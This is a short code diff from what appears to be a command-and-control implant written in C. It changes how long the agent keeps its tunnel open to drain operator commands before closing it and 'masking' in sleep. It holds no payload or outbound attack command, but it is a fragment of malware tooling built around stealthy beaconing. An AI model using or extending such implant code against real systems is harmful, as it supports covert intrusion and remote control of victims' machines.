@@ -194,25 +194,14 @@ static int pending_append(hp_ctx *h, const uint8_t *data, size_t len) {
   return 0;
 }
 
-/* Keep the unmasked poll window short compared with the beacon interval. The
- * window is bounded by the configured reconnect timeout and never exceeds half
- * the interval; a shorter window makes the agent sleep sooner but also widens
- * the race between closing an idle tunnel and an operator sending a command. */
+/* User-configurable window for draining queued commands after hello. The
+ * agent closes the tunnel and masks when it expires. */
 static long hp_read_timeout_s(const c2_agent_config *cfg) {
-  long timeout = 10;
-  if (cfg->cc_timeout_ms > 0)
-    timeout = ((long)cfg->cc_timeout_ms + 999) / 1000;
-  if (cfg->poll_interval > 0) {
-    long half = cfg->poll_interval / 2;
-    if (half < 1)
-      half = 1;
-    if (timeout > half)
-      timeout = half;
-  }
-  if (timeout < 1)
-    timeout = 1;
-  if (timeout > 90)
-    timeout = 90;
+  long timeout = cfg->poll_window;
+  if (timeout <= 0)
+    timeout = 5; /* C2_DEFAULT_POLL_WINDOW */
+  if (timeout > 3600)
+    timeout = 3600;
   return timeout;
 }
 
